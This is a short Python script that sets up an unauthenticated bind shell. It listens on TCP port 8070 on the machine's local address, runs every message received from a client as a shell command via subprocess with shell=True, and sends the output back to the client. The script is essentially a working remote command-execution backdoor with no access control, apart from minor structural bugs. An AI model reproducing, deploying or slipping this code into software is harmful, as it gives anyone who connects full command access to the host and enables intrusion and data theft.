import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]
s.close()



def ClientListener(self):
    while True:
        # self.csocket.send(bytes(res, 'UTF-8'))
        data = self.csocket.recv(2048)
        msg = data.decode()
        print("msg from client:", msg)
        try:
            output = subprocess.check_output(msg, shell=True)
            print(output)
        except:
            output = "Failed"
        self.csocket.send(bytes(str(output), 'UTF-8'))
        if msg == 'bye':
            break
    print("Client at ", clientAddress, " disconnected...")

class ClientThread():
    def __init__(self, clientAddress, clientsocket):
        self.csocket = clientsocket
        self.socket = clientsock
        print("New connection added: ", clientAddress)
        try:
            ClientListener(self)
            print("Done")

        except:
            print("Connection closed")


PORT = 8070
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((ip, PORT))
print("Server started at "+str(ip)+":"+str(PORT))
print("Waiting for  request..")

server.listen(1)
clientsock, clientAddress = server.accept()
ClientThread(clientAddress, clientsock)